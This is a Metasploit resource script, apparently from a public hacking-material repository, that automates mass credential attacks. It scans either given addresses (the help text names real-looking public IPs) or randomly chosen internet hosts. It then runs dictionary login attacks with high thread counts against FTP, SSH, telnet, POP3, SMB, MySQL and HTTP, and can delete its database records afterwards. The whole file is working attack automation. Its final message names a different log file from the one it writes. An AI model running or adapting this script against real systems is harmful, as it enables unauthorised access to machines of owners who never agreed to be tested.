   <ruby>
      help = %Q|
        Description:
          setg CLEAN false - Do not clean database at script exit.
          setg RANDOM 1000 - Limit the number of random rhosts to search
          setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with ports open
          setg RHOSTS 216.15.177.33 186.210.228.3 - To instruct db_nmap to check targets for ports open
          setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
          In this example we are using db_nmap to populate msfdb database with hosts
          then it triggers msf auxiliary/scanners based on target open ports reported.
          this module probes for 21:22:23:80:110:445:3306 remote TCP ports open.

        Execute in msfconsole:
          setg RANDOM <number-of-rhosts>
          setg RANDOM_HOSTS <true-or-blank>
          setg RHOSTS <hosts-separated-by-spaces>
          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
          resource <path-to-script>/brute_force.rc

        Author:
          r00t-3xp10it  <pedroubuntu10[at]gmail.com>
      |
      print_line(help)
      Rex::sleep(1.5)


      if (framework.datastore['RANDOM_HOSTS'] == 'true')
         if (framework.datastore['RANDOM'] == nil or framework.datastore['RANDOM'] == '')
           run_single("setg RANDOM 500")
           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['RANDOM']} -p 21,22,23,80,110,445,3306 --open --script=smb-os-discovery.nse,http-headers.nse")
         else
           print_line("RANDOM => #{framework.datastore['RANDOM']}")
           print_line("RHOSTS => db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['RANDOM']} -p 21,22,23,80,110,445,3306 --open --script=smb-os-discovery.nse,http-headers.nse")
         end
      elsif (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
         run_single("setg RHOSTS 192.168.1.0/24")
      elsif (framework.datastore['RHOSTS'])
         print_line("RHOSTS => #{framework.datastore['RHOSTS']}")
      end
      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
         run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
      end
      unless (framework.datastore['RANDOM_HOSTS'] == 'true')
         run_single("db_nmap -sV -Pn -T4 -O -p 21,22,23,80,110,445,3306 --open --script=smb-os-discovery.nse,http-headers.nse #{framework.datastore['RHOSTS']}")
      else
         print_warning("db_nmap: search for random remote targets with ports 21,22,23,80,110,445,3306 open")
         run_single("db_nmap -sV -Pn -T4 -O -iR #{framework.datastore['RANDOM']} -p 21,22,23,80,110,445,3306 --open --script=smb-os-discovery.nse,http-headers.nse")
      end

      run_single("spool /root/brute_force.log")
      print_line("")
      run_single("services")
      print_good("Reading msfdb database for info.")
      xname = framework.db.hosts.map(&:os_name).join(' ')
      xhost = framework.db.hosts.map(&:address).join(' ')
      xport = framework.db.services.map(&:port).join(' ')
      proto = framework.db.services.map(&:proto).join(' ')
      print_status("Target systems detected: #{xname}")
      run_single("setg RHOSTS #{xhost}")
      Rex::sleep(2.0)

         if xhost.nil? or xhost == ''
              print_error("db_nmap scan did not find any alive connections.")
              print_error("please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              print_line("")
              run_single("unsetg RANDOM RANDOM_HOSTS RHOSTS USERPASS_FILE")
              File.delete('/root/brute_force.log')
              return nil
         elsif xport.nil? or xport == ''
              print_error("db_nmap did not find any 21:22:23:80:110:445:3306 open ports.")
              print_error("please wait, cleaning recent configurations.")
              Rex::sleep(1.0)
              print_line("")
              run_single("unsetg RANDOM RANDOM_HOSTS RHOSTS USERPASS_FILE")
              run_single("services -d")
              run_single("hosts -d")
              File.delete('/root/brute_force.log')
              return nil
         end

         if xport =~ /21/i or proto =~ /ftp/i
              print_warning("Remote Target port: 21 ftp found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ftp/ftp_version")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/anonymous")
              run_single("set THREADS 35")
              run_single("exploit")
              run_single("use auxiliary/scanner/ftp/ftp_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BRUTEFORCE_SPEED 4")
              run_single("set THREADS 70")
              run_single("exploit")
         end

         if xport =~ /22/i or proto =~ /ssh/i
              print_warning("Remote Target port: 22 ssh found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/ssh/ssh_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 30")
              run_single("exploit")
         end

         if xport =~ /23/i or proto =~ /telnet/i
              print_warning("Remote Target port: 23 telnet found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/telnet/telnet_version")
              run_single("exploit")
              run_single("use auxiliary/scanner/telnet/telnet_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /110/i or proto =~ /pop3/i
              print_warning("Remote Target port: 110 pop3 found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/pop3/pop3_version")
              run_single("set THREADS 30")
              run_single("exploit")
              run_single("use auxiliary/scanner/pop3/pop3_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /445/i or proto =~ /smb/i
              print_warning("Remote Target port: 445 smb found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/smb/smb_version")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumusers")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_enumshares")
              run_single("set THREADS 16")
              run_single("exploit")
              run_single("use auxiliary/scanner/smb/smb_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

         if xport =~ /3306/i or proto =~ /mysql/i
              print_warning("Remote Target port 3306 mysql found.")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/mysql/mysql_version")
              run_single("set THREADS 20")
              run_single("exploit")
              Rex::sleep(1.5)
              run_single("use auxiliary/scanner/mysql/mysql_login")
              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set BLANK_PASSWORDS true")
              run_single("set VERBOSE true")
              run_single("set THREADS 100")
              run_single("exploit")
              Rex::sleep(1.5)
         end

         if xport =~ /80/i or proto =~ /http/i
              print_warning("Remote Target port: 80 http found")
              Rex::sleep(1.0)
              run_single("use auxiliary/scanner/http/title")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/options")
              run_single("set THREADS 11")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/dir_scanner")
              run_single("exploit")
              run_single("use auxiliary/scanner/http/http_login")
              run_single("set STOP_ON_SUCCESS true")
              run_single("set THREADS 16")
              run_single("exploit")
         end

      print_warning("Please wait, Cleaning global variables.")
      Rex::sleep(1.5)
      if (framework.datastore['CLEAN'] == "false")
           run_single("unsetg CLEAN RHOSTS RANDOM RANDOM_HOSTS USERPASS_FILE")
           run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED BLANK_PASSWORDS USERPASS_FILE STOP_ON_SUCCESS")
           print_line("")
      else
           run_single("unsetg CLEAN RHOSTS RANDOM RANDOM_HOSTS USERPASS_FILE")
           run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED BLANK_PASSWORDS USERPASS_FILE STOP_ON_SUCCESS")
           print_warning("Please wait, Cleaning database.")
           Rex::sleep(1.5)
           run_single("hosts -d")
           run_single("services -d")
           print_line("")
      end

      print_warning("Logfile stored under: /root/mysql_brute.log")
      print_status("https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md")
   </ruby>
